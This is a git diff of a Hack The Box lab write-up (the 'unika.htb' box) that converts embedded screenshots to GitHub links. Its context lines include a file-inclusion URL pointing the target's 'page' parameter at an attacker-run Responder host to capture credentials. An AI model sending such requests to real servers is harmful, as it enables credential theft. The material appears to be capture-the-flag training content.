@@ -19,7 +19,7 @@ When visiting the web service using the IP address, what is the domain that we a
 
 <details> <summary>Task 1 Hint</summary> Use the browser to visit the IP address of the box and watch how it changes.</details>
 
-![[Pasted image 20240725102844.png]]
+![Pasted image 20240725102844](https://github.com/user-attachments/assets/0ca71313-fdf5-4b84-abb3-d1bd155b64e0)
 
 ```bash
 ┌──(root㉿neo)-[~]
@@ -36,7 +36,7 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-![[Pasted image 20240725103202.png]]
+![Pasted image 20240725103202](https://github.com/user-attachments/assets/332134d6-4e51-4a61-b818-87c4bba37396)
 
 **Ans :**
 ```
@@ -66,7 +66,7 @@ What is the name of the URL parameter which is used to load different language v
 
 </details>
 
-![[Pasted image 20240725103637.png]]
+![Pasted image 20240725103637](https://github.com/user-attachments/assets/05eebb6f-05b1-4717-ad04-d39b9b854a70)
 
 **Ans :**
 ```
@@ -83,7 +83,7 @@ Which of the following values for the `page` parameter would be an example of ex
 
 </details>
 
-![[Pasted image 20240725103817.png]]
+![Pasted image 20240725103817](https://github.com/user-attachments/assets/cd2c433c-8f39-41f0-a19a-05238805991b)
 
 **Ans :**
 ```
@@ -237,7 +237,7 @@ Responder Set to tun0 (hackthebox vpn ip)
 http://unika.htb/index.php?page=//10.10.15.210/somefile
 ```
 
-![[Pasted image 20240725105901.png]]
+![Pasted image 20240725105901](https://github.com/user-attachments/assets/95b024f4-6df0-4497-bcad-ed7a30808df5)
 
 **Responder :**
 
